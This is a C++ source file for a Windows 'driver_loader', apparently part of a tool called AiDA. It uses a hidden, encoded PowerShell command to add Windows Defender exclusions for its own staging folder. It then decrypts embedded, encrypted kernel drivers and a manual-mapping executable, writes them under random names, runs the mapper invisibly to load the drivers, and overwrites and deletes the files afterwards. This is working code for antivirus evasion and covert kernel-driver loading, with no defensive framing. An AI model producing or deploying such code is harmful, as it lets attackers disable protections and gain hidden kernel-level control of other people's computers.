#include "driver_loader.hpp"
#include "whoswho_encrypted.h"
#include "sentinel_encrypted.h"
#include "windmapper_embedded.h"

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <bcrypt.h>
#include <ntstatus.h>
#include <shlobj.h>
#include <objbase.h>
#include <wincrypt.h>
#include <cstdio>
#include <cstring>
#include <string>
#include <vector>
#include <filesystem>

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "crypt32.lib")

#ifndef STATUS_AUTH_TAG_MISMATCH
#define STATUS_AUTH_TAG_MISMATCH ((NTSTATUS)0xC000A002L)
#endif

namespace
{
    bool g_loaded = false;
    std::string s_last_error;

    void set_last_error(const char* msg)
    {
        s_last_error.assign(msg ? msg : "");
    }

    void set_last_error(const std::string& msg)
    {
        s_last_error = msg;
    }

    void set_last_error_status(const char* prefix, NTSTATUS status)
    {
        char buf[64] = {};
        std::snprintf(buf, sizeof(buf), " (NTSTATUS=0x%08lX)",
                      static_cast<unsigned long>(status));
        std::string out = prefix ? prefix : "";
        out += buf;
        s_last_error = out;
    }

    bool verify_blob_integrity(const unsigned char* data, unsigned long size,
                               unsigned long expected_size)
    {
        if (size != expected_size)
            return false;
        if (size < 64 || data[0] != 'M' || data[1] != 'Z')
            return false;
        uint32_t e_lfanew = *reinterpret_cast<const uint32_t*>(data + 0x3C);
        if (e_lfanew >= size - 4)
            return false;
        if (data[e_lfanew] != 'P' || data[e_lfanew + 1] != 'E' ||
            data[e_lfanew + 2] != 0 || data[e_lfanew + 3] != 0)
            return false;
        return true;
    }

    std::wstring get_stage_dir()
    {
        wchar_t* local = nullptr;
        if (FAILED(SHGetKnownFolderPath(FOLDERID_LocalAppData, KF_FLAG_CREATE, nullptr, &local)) || !local)
            return {};
        std::filesystem::path p(local);
        CoTaskMemFree(local);
        p /= L"AiDA";
        p /= L"Standalone";
        p /= L"stage";
        std::error_code ec;
        std::filesystem::create_directories(p, ec);
        if (ec)
            return {};
        return p.wstring();
    }

    std::wstring random_token(size_t bytes)
    {
        std::wstring out;
        unsigned char raw[32] = {};
        if (bytes > sizeof(raw))
            bytes = sizeof(raw);
        if (BCryptGenRandom(nullptr, raw, static_cast<ULONG>(bytes),
                            BCRYPT_USE_SYSTEM_PREFERRED_RNG) != 0)
            return out;
        static const wchar_t* hex = L"0123456789abcdef";
        out.reserve(bytes * 2);
        for (size_t i = 0; i < bytes; ++i) {
            out.push_back(hex[(raw[i] >> 4) & 0xF]);
            out.push_back(hex[raw[i] & 0xF]);
        }
        return out;
    }

    std::wstring make_stage_path(const std::wstring& dir, const wchar_t* ext)
    {
        if (dir.empty())
            return {};
        std::wstring name = random_token(8);
        if (name.empty())
            return {};
        std::filesystem::path p = std::filesystem::path(dir) / (name + ext);
        return p.wstring();
    }

    std::wstring base64_encode_utf16(const std::wstring& s)
    {
        std::wstring out;
        if (s.empty())
            return out;
        DWORD bytes = static_cast<DWORD>(s.size() * sizeof(wchar_t));
        DWORD encoded = 0;
        if (!CryptBinaryToStringW(reinterpret_cast<const BYTE*>(s.data()), bytes,
                                  CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
                                  nullptr, &encoded) || encoded == 0)
            return out;
        out.resize(encoded);
        if (!CryptBinaryToStringW(reinterpret_cast<const BYTE*>(s.data()), bytes,
                                  CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
                                  &out[0], &encoded)) {
            out.clear();
            return out;
        }
        if (!out.empty() && out.back() == L'\0')
            out.pop_back();
        return out;
    }

    void register_defender_exclusion(const std::wstring& dir)
    {
        if (dir.empty())
            return;

        std::wstring quoted;
        quoted.reserve(dir.size() * 2 + 4);
        quoted.push_back(L'\'');
        for (wchar_t c : dir) {
            if (c == L'\'')
                quoted.push_back(L'\'');
            quoted.push_back(c);
        }
        quoted.push_back(L'\'');

        std::wstring script =
            L"$ErrorActionPreference='SilentlyContinue';"
            L"try{Add-MpPreference -ExclusionPath " + quoted + L" -Force}catch{};"
            L"try{Add-MpPreference -ExclusionProcess " + quoted + L" -Force}catch{}";

        std::wstring encoded = base64_encode_utf16(script);
        if (encoded.empty())
            return;

        wchar_t sysdir[MAX_PATH] = {};
        if (!GetSystemDirectoryW(sysdir, MAX_PATH))
            return;
        std::wstring exe = std::wstring(sysdir) + L"\\WindowsPowerShell\\v1.0\\powershell.exe";

        std::wstring cmdline = L"\"" + exe +
            L"\" -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand " +
            encoded;

        STARTUPINFOW si = {};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi = {};
        if (!CreateProcessW(exe.c_str(), &cmdline[0], nullptr, nullptr, FALSE,
                            CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi))
            return;

        WaitForSingleObject(pi.hProcess, 30000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    bool aes_gcm_decrypt(const unsigned char* ciphertext, unsigned long ciphertext_len,
                         const unsigned char* key, unsigned long key_len,
                         const unsigned char* nonce, unsigned long nonce_len,
                         const unsigned char* tag, unsigned long tag_len,
                         unsigned char* plaintext, unsigned long plaintext_len)
    {
        if (!ciphertext || !key || !nonce || !tag || !plaintext)
            return false;
        if (key_len != 32 || nonce_len != 12 || tag_len != 16)
            return false;
        if (ciphertext_len != plaintext_len)
            return false;

        BCRYPT_ALG_HANDLE alg = nullptr;
        NTSTATUS status = BCryptOpenAlgorithmProvider(&alg, BCRYPT_AES_ALGORITHM, nullptr, 0);
        if (!BCRYPT_SUCCESS(status)) {
            set_last_error_status("BCryptOpenAlgorithmProvider failed", status);
            return false;
        }

        status = BCryptSetProperty(alg, BCRYPT_CHAINING_MODE,
                                   reinterpret_cast<PUCHAR>(const_cast<wchar_t*>(BCRYPT_CHAIN_MODE_GCM)),
                                   sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
        if (!BCRYPT_SUCCESS(status)) {
            BCryptCloseAlgorithmProvider(alg, 0);
            set_last_error_status("BCryptSetProperty(GCM) failed", status);
            return false;
        }

        DWORD object_length = 0;
        DWORD got = 0;
        status = BCryptGetProperty(alg, BCRYPT_OBJECT_LENGTH,
                                   reinterpret_cast<PUCHAR>(&object_length),
                                   sizeof(object_length), &got, 0);
        if (!BCRYPT_SUCCESS(status) || got != sizeof(object_length) || object_length == 0) {
            BCryptCloseAlgorithmProvider(alg, 0);
            set_last_error_status("BCryptGetProperty(OBJECT_LENGTH) failed", status);
            return false;
        }

        std::vector<unsigned char> key_object(object_length, 0);
        BCRYPT_KEY_HANDLE hkey = nullptr;
        status = BCryptGenerateSymmetricKey(alg, &hkey,
                                            key_object.data(), object_length,
                                            const_cast<PUCHAR>(key), key_len, 0);
        if (!BCRYPT_SUCCESS(status)) {
            BCryptCloseAlgorithmProvider(alg, 0);
            set_last_error_status("BCryptGenerateSymmetricKey failed", status);
            return false;
        }

        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info = {};
        BCRYPT_INIT_AUTH_MODE_INFO(info);
        info.pbNonce = const_cast<PUCHAR>(nonce);
        info.cbNonce = nonce_len;
        info.pbAuthData = nullptr;
        info.cbAuthData = 0;
        info.pbTag = const_cast<PUCHAR>(tag);
        info.cbTag = tag_len;
        info.pbMacContext = nullptr;
        info.cbMacContext = 0;
        info.cbAAD = 0;
        info.cbData = 0;
        info.dwFlags = 0;

        ULONG out_len = 0;
        status = BCryptDecrypt(hkey,
                               const_cast<PUCHAR>(ciphertext), ciphertext_len,
                               &info,
                               nullptr, 0,
                               plaintext, plaintext_len,
                               &out_len, 0);

        BCryptDestroyKey(hkey);
        SecureZeroMemory(key_object.data(), key_object.size());
        BCryptCloseAlgorithmProvider(alg, 0);

        if (status == STATUS_AUTH_TAG_MISMATCH) {
            SecureZeroMemory(plaintext, plaintext_len);
            set_last_error("AES-GCM tag mismatch (driver blob tampered)");
            return false;
        }
        if (!BCRYPT_SUCCESS(status)) {
            SecureZeroMemory(plaintext, plaintext_len);
            set_last_error_status("BCryptDecrypt failed", status);
            return false;
        }
        if (out_len != plaintext_len) {
            SecureZeroMemory(plaintext, plaintext_len);
            set_last_error("AES-GCM decrypt produced unexpected length");
            return false;
        }
        return true;
    }

    bool decrypt_and_write(const unsigned char* ciphertext, unsigned long ciphertext_len,
                           const unsigned char* key, unsigned long key_len,
                           const unsigned char* nonce, unsigned long nonce_len,
                           const unsigned char* tag, unsigned long tag_len,
                           const std::wstring& out_path)
    {
        auto* buf = static_cast<unsigned char*>(
            VirtualAlloc(nullptr, ciphertext_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
        if (!buf) {
            set_last_error("VirtualAlloc failed for driver decrypt buffer");
            return false;
        }

        if (!aes_gcm_decrypt(ciphertext, ciphertext_len,
                             key, key_len,
                             nonce, nonce_len,
                             tag, tag_len,
                             buf, ciphertext_len)) {
            SecureZeroMemory(buf, ciphertext_len);
            VirtualFree(buf, 0, MEM_RELEASE);
            return false;
        }

        if (!verify_blob_integrity(buf, ciphertext_len, ciphertext_len)) {
            SecureZeroMemory(buf, ciphertext_len);
            VirtualFree(buf, 0, MEM_RELEASE);
            set_last_error("Decrypted driver blob failed PE integrity check");
            return false;
        }

        HANDLE hf = CreateFileW(out_path.c_str(), GENERIC_WRITE, 0, nullptr,
                                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hf == INVALID_HANDLE_VALUE) {
            SecureZeroMemory(buf, ciphertext_len);
            VirtualFree(buf, 0, MEM_RELEASE);
            set_last_error("CreateFileW failed for staged driver");
            return false;
        }

        DWORD written = 0;
        BOOL ok = WriteFile(hf, buf, ciphertext_len, &written, nullptr);
        FlushFileBuffers(hf);
        CloseHandle(hf);
        SecureZeroMemory(buf, ciphertext_len);
        VirtualFree(buf, 0, MEM_RELEASE);

        if (!ok || written != ciphertext_len) {
            set_last_error("WriteFile failed for staged driver");
            return false;
        }
        return true;
    }

    void secure_delete(const std::wstring& path)
    {
        HANDLE hf = CreateFileW(path.c_str(), GENERIC_WRITE, 0, nullptr,
                                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hf != INVALID_HANDLE_VALUE) {
            LARGE_INTEGER size;
            if (GetFileSizeEx(hf, &size) && size.QuadPart > 0) {
                auto* zeros = static_cast<unsigned char*>(
                    VirtualAlloc(nullptr, static_cast<SIZE_T>(size.QuadPart),
                                 MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
                if (zeros) {
                    DWORD written = 0;
                    WriteFile(hf, zeros, static_cast<DWORD>(size.QuadPart), &written, nullptr);
                    FlushFileBuffers(hf);
                    VirtualFree(zeros, 0, MEM_RELEASE);
                }
            }
            CloseHandle(hf);
        }
        DeleteFileW(path.c_str());
    }
}

namespace driver_loader
{
    bool is_driver_loaded()
    {
        return g_loaded;
    }

    const std::string& last_error()
    {
        return s_last_error;
    }

    bool initialize_and_load()
    {
        if (g_loaded)
            return true;

        s_last_error.clear();

        std::wstring stage = get_stage_dir();
        if (stage.empty()) {
            set_last_error("Failed to resolve LocalAppData stage directory");
            return false;
        }

        register_defender_exclusion(stage);

        std::wstring mapper_path = make_stage_path(stage, L".exe");
        std::wstring whoswho_path = make_stage_path(stage, L".sys");
        std::wstring sentinel_path = make_stage_path(stage, L".sys");
        if (mapper_path.empty() || whoswho_path.empty() || sentinel_path.empty()) {
            set_last_error("Failed to allocate randomized stage paths");
            return false;
        }

        if (!decrypt_and_write(g_windmapper_ciphertext, g_windmapper_ciphertext_len,
                               g_windmapper_key, sizeof(g_windmapper_key),
                               g_windmapper_nonce, sizeof(g_windmapper_nonce),
                               g_windmapper_tag, sizeof(g_windmapper_tag),
                               mapper_path)) {
            return false;
        }

        if (!decrypt_and_write(g_whoswho_ciphertext, g_whoswho_ciphertext_len,
                               g_whoswho_key, sizeof(g_whoswho_key),
                               g_whoswho_nonce, sizeof(g_whoswho_nonce),
                               g_whoswho_tag, sizeof(g_whoswho_tag),
                               whoswho_path)) {
            secure_delete(mapper_path);
            return false;
        }

        if (!decrypt_and_write(g_sentinel_ciphertext, g_sentinel_ciphertext_len,
                               g_sentinel_key, sizeof(g_sentinel_key),
                               g_sentinel_nonce, sizeof(g_sentinel_nonce),
                               g_sentinel_tag, sizeof(g_sentinel_tag),
                               sentinel_path)) {
            secure_delete(mapper_path);
            secure_delete(whoswho_path);
            return false;
        }

        std::wstring cmdline = L"\"" + mapper_path + L"\" \"" +
                               whoswho_path + L"\" \"" + sentinel_path + L"\"";

        STARTUPINFOW si = {};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        PROCESS_INFORMATION pi = {};
        BOOL created = CreateProcessW(
            mapper_path.c_str(),
            &cmdline[0],
            nullptr, nullptr,
            FALSE,
            CREATE_NO_WINDOW | CREATE_SUSPENDED,
            nullptr, nullptr,
            &si, &pi);

        if (!created) {
            secure_delete(mapper_path);
            secure_delete(whoswho_path);
            secure_delete(sentinel_path);
            set_last_error("CreateProcessW failed for mapper stage");
            return false;
        }

        HANDLE hJob = CreateJobObjectW(nullptr, nullptr);
        if (hJob) {
            JOBOBJECT_EXTENDED_LIMIT_INFORMATION jeli = {};
            jeli.BasicLimitInformation.LimitFlags =
                JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE |
                JOB_OBJECT_LIMIT_DIE_ON_UNHANDLED_EXCEPTION;
            SetInformationJobObject(hJob, JobObjectExtendedLimitInformation,
                                    &jeli, sizeof(jeli));
            AssignProcessToJobObject(hJob, pi.hProcess);
        }

        ResumeThread(pi.hThread);

        WaitForSingleObject(pi.hProcess, 90000);

        DWORD exit_code = 1;
        GetExitCodeProcess(pi.hProcess, &exit_code);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        if (hJob)
            CloseHandle(hJob);

        secure_delete(mapper_path);
        secure_delete(whoswho_path);
        secure_delete(sentinel_path);

        if (exit_code != 0) {
            set_last_error("Mapper stage exited with non-zero status");
            return false;
        }

        g_loaded = true;
        return true;
    }
}
